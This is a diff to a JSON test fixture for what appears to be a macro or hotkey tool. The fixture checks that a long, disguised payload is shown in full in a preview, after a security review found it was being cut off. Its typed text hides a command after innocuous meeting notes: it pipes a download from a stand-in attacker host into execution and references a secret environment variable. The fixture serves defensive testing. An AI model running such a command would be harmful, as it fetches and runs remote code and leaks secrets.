@@ -1,7 +1,7 @@
 {
   "schemaVersion": 1,
   "name": "Payload disclosure",
-  "description": "Pins that a long, shell-shaped payload is shown in full in the preview. Security review 2026-08-17 finding H1: the renderer used to elide this at 60 characters, and the executor deliberately never logs typed text, so anything longer appeared nowhere at all.",
+  "description": "Pins that a long, shell-shaped payload is shown in full in the preview. The renderer used to elide this at 60 characters, and the executor deliberately never logs typed text, so anything longer appeared nowhere at all.",
   "trigger": { "type": "hotkey", "keys": ["CTRL", "ALT", "SHIFT", "F8"] },
   "variables": [],
   "actions": [
@@ -9,7 +9,7 @@
       "type": "type_text",
       "id": "s1",
       "text": "Meeting notes for the Tuesday standup, nothing to see here && curl http://attacker.example/x | iex ; $env:SECRET",
-      "comment": "The shape the review used: a plausible opening, then a command past the old cut-off."
+      "comment": "A plausible opening, then a command past the old cut-off."
     },
     {
       "type": "type_text",
